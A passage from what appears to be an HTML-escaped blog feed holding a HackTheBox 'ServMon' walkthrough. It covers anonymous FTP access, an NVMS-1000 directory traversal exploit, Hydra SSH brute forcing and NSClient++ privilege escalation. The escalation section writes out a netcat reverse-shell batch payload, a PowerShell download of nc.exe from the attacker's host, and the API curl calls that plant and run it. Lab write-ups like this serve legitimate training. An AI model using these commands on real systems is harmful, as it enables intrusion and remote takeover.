+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt; &lt;/p&gt;
+
+&lt;h3 id=&quot;12--ftp&quot;&gt;1.2 || FTP&lt;/h3&gt;
+
+&lt;p&gt;Nmap result shows us that it has &lt;code class=&quot;highlighter-rouge&quot;&gt;FTP&lt;/code&gt; service running and on detecting &lt;code class=&quot;highlighter-rouge&quot;&gt;Anonymous FTP&lt;/code&gt;, we were able to get FTP access of the machine. &lt;code class=&quot;highlighter-rouge&quot;&gt;Anonymous FTP&lt;/code&gt; reveals a file named &lt;code class=&quot;highlighter-rouge&quot;&gt;Confidential.txt&lt;/code&gt; which gives us hint of a &lt;code class=&quot;highlighter-rouge&quot;&gt;Passwors.txt&lt;/code&gt; file being stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathane's&lt;/code&gt; Desktop.&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;FTP access&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ ftp 10.10.10.184&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/1.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/2.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Confidential.txt&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/3.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;h3 id=&quot;13--nvms-1000-port-80&quot;&gt;1.3 || NVMS-1000 (Port 80)&lt;/h3&gt;
+
+&lt;p&gt;On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. &lt;code class=&quot;highlighter-rouge&quot;&gt;NVMS-1000&lt;/code&gt;. Exploit-Db suggests an exploit of &lt;code class=&quot;highlighter-rouge&quot;&gt;NVMS-1000&lt;/code&gt; being vulnerable to Directory Traversal attack.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;POC&lt;/strong&gt;: &lt;a href=&quot;https://www.expxloit-db.com/exploits/48311&quot;&gt;https://www.expxloit-db.com/exploits/48311&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/4.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Executing the script by providing proper paarameters as shown in below picture results in access of &lt;code class=&quot;highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan's&lt;/code&gt; desktop.&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ python 48311.py http://10.10.10.184/ /Users/Nathan/Desktop/Passwords.txt passwords_list.txt&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/5.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;h2 id=&quot;2-low-privilege-shell&quot;&gt;2. Low-Privilege Shell&lt;/h2&gt;
+
+&lt;p&gt;Once we have acquired the password file, ideally, any pentester would go for &lt;code class=&quot;highlighter-rouge&quot;&gt;Brute Forcing&lt;/code&gt; methodology as we have two usernames ( &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathane&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Nadine&lt;/code&gt; ) and a password file.&lt;/p&gt;
+
+&lt;p&gt;Using &lt;a href=&quot;&quot;&gt;Hydra&lt;/a&gt; for brute forcing the &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH&lt;/code&gt; service, we successfully pwned one of the users ( &lt;code class=&quot;highlighter-rouge&quot;&gt;Nadine&lt;/code&gt; ) password&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Run Hydra&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ hydra -l nadine -P passwords.txt 10.10.10.182&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/6.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH login to get Low-Privilege Shell&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;As we were successfully able to retrieve password of &lt;code class=&quot;highlighter-rouge&quot;&gt;Nadine&lt;/code&gt;, we’ll login as &lt;code class=&quot;highlighter-rouge&quot;&gt;Nadine&lt;/code&gt; via &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH&lt;/code&gt; service and complete one of the challegenes of the machine i.e. acquire user.txt file.&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ ssh 10.10.10.184&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/7.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Get user.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/8.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;h2 id=&quot;3-privilege-escalation&quot;&gt;3. Privilege Escalation&lt;/h2&gt;
+
+&lt;h3 id=&quot;31--enumerate-local-system&quot;&gt;3.1 || Enumerate local system&lt;/h3&gt;
+
+&lt;p&gt;Our next step to get maximum level of privilege and in the process od doing so, we were able to discover the target machines uses &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient ++&lt;/code&gt;. This service was also discover via nmap output ( &lt;code class=&quot;highlighter-rouge&quot;&gt;8443&lt;/code&gt; .)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Port 8443&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/9.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On searching for exploits with respect to &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient ++&lt;/code&gt;, we were able to find a wtiteup on exploit-db to escalte the privilege by exploiting &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient ++&lt;/code&gt; exploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;NSClient ++ writeup on exploit-db&lt;/strong&gt;: &lt;a href=&quot;https://www.expxloit-db.com/exploits/46802&quot;&gt;https://www.expxloit-db.com/exploits/46802&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/10.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;h3 id=&quot;32---nsclient--exploitation-steps&quot;&gt;3.2 ||  NSClient ++ Exploitation Steps&lt;/h3&gt;
+
+&lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Step 1: Grab Web Admin Password&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Navigate to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Program Files\NSClient++&lt;/code&gt; folder and execute the below command:&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ nscp.exe web --password --display&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/11.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Step 2: Enable CheckExternalScript &amp;amp; Scheduler&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;On checking the configuration file ( &lt;code class=&quot;highlighter-rouge&quot;&gt;nsclient.ini&lt;/code&gt; ), &lt;code class=&quot;highlighter-rouge&quot;&gt;CheckExternalScript&lt;/code&gt; &amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;Scheduler&lt;/code&gt; were enabled already.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/12.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/13.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Step 3: Create Payload&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;As per the exploit poc, we are supposed to create a &lt;code class=&quot;highlighter-rouge&quot;&gt;.bat&lt;/code&gt; consisting of the below payload and add as an external script to &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient++&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo off&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;C:\temp\nc.exe 10.10.15.137 443 -e cmd.exe&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;where,&lt;/p&gt;
+
+&lt;p&gt;    &lt;strong&gt;10.10.15.137&lt;/strong&gt;: Listening HOST ( Attacking machine’s IP address)&lt;/p&gt;
+
+&lt;p&gt;    &lt;strong&gt;443&lt;/strong&gt;: Listening Port ( Attacking machine’s listening port)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Commands Issued&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ echo @off &amp;gt; evilish.bat&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;$ echo C:\Temp\nc.exe 10.10.15.137 443 -e cmd.exe &amp;gt;&amp;gt; evilish.bat&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/14.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Adding an external script can be acheived by logging in via the web portal availble on port &lt;code class=&quot;highlighter-rouge&quot;&gt;8443&lt;/code&gt;. However, for some strange reason, the web portal seemt to be very unstable and hence, we’ll be following &lt;code class=&quot;highlighter-rouge&quot;&gt;API&lt;/code&gt; available in documentation of &lt;a href=&quot;&quot;&gt;NSClient_++&lt;/a&gt; via using curl commands locally.&lt;/p&gt;
+
+&lt;p&gt;Under the &lt;code class=&quot;highlighter-rouge&quot;&gt;Scripts&lt;/code&gt; section API documentation, we were able to discover a method to add an external script via command line.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/15.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Below is the issued command:&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/check_new.bat --data-binary @evilish.bat&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/16.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On using the above command, it prompts for a password. The password to be used is password discover in &lt;code class=&quot;highlighter-rouge&quot;&gt;Step 1&lt;/code&gt; ( &lt;code class=&quot;highlighter-rouge&quot;&gt;ew2x6SsGTxjRwXOT&lt;/code&gt; )&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Step 4: Download nc.exe to target machine&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;There are multiple ways to download a file from attacking machince to target machine. In this machine, we’ll be using below command to download:&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ powershell.exe &quot;IEX(New-Object Ssytem.Net.WebClient).DownloadFile('http://10.10.15.137:8081/nc.exe','C:\Temp\nc.exe')&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;where,&lt;/p&gt;
+
+&lt;p&gt;    &lt;strong&gt;http://10.10.15.137:8081/nc.exe&lt;/strong&gt;: IP Path of nc.exe hosted on attacking machine&lt;/p&gt;
+
+&lt;p&gt;    &lt;strong&gt;C:\Temp\nc.exe&lt;/strong&gt;: Output path and filename of the downloaded file&lt;/p&gt;
+
+&lt;p&gt;Before issuing the above command, it is necessary to host the &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; file first on attacking machine by using the below command:&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ python -m SimpleHTTPServer &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;8081&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Step 5: Execute the payload&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;To get a privileged shell, we need to execute the payload  created earlier. Under &lt;code class=&quot;highlighter-rouge&quot;&gt;Query&lt;/code&gt; section of API documentation, we can execute the external script uploaded earlier.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/17.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Command Issued:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ curl -s -k -u admin https://1ocalhost:8443/api/v1/queries/check_new/commands/execute?time=3m&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/18.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;h3 id=&quot;32--privileged-shell&quot;&gt;3.2 || Privileged Shell&lt;/h3&gt;
+
+&lt;p&gt;Before performing &lt;code class=&quot;highlighter-rouge&quot;&gt;Step 5&lt;/code&gt; from the previous section, we need to create a listener at out attacking machine. Below is the command to listening for getting a reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ nc -lvnp &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Once the listener is set, we can execute the payload and get a reverse shell with admin privileges.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/20.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;h3 id=&quot;33--roottxt&quot;&gt;3.3 || root.txt&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/21.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;h2 id=&quot;key-takeway&quot;&gt;Key Takeway:&lt;/h2&gt;
+
+&lt;p&gt;As the main motto to build HackTheBox platform for security researchers is to help us hone our testing skills and hence, every machine has its key takeways.&lt;/p&gt;
+
+&lt;p&gt;For me, the key takeways was services discovered via nmap also runs on localhost in the target machine. As explained above, &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient++&lt;/code&gt; web portal was unstable and hence, we had to attack via command line against localhost.&lt;/p&gt;</content><author><name>Rajat Rao</name></author><category term="HTB" /><summary type="html">Brief     On enumerating different services of ServMon machine, we were able to find few confidentails files from FTP service which discloses a hint saying that list of password is stored in Nathan uers desktop. On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. NVMS-1000. On assessing the software, it was vulnerable to Directory Traversal vulnerability which helps us to conquer the Passwords.txt from Nathan's desktop by using exploit available on exploit-db. On this point we have got a list of passsword and two usersname ( Nathan and Nadine ), we try to brute force the available SSH service on target machine using Hydra. On the conclusion of brute forcing, we were able to find credentails of nadine and taking leverage of it, we ssh to the machine using nadine cracked password and get proof.txt. Once we got the local access, enumeration helped us to find NSClient++ running and on expxloitation of it using publicly available script, we were able to get maximum level of privelege and get root.txt.</summary></entry><entry><title type="html">Mobile Security</title><link href="http://localhost:4000/learning/2020/06/10/Mobile-Security/" rel="alternate" type="text/html" title="Mobile Security" /><published>2020-06-10T14:35:23+05:30</published><updated>2020-06-10T14:35:23+05:30</updated><id>http://localhost:4000/learning/2020/06/10/Mobile-Security</id><content type="html" xml:base="http://localhost:4000/learning/2020/06/10/Mobile-Security/">&lt;style&gt;
 * {
   box-sizing: border-box;
 }
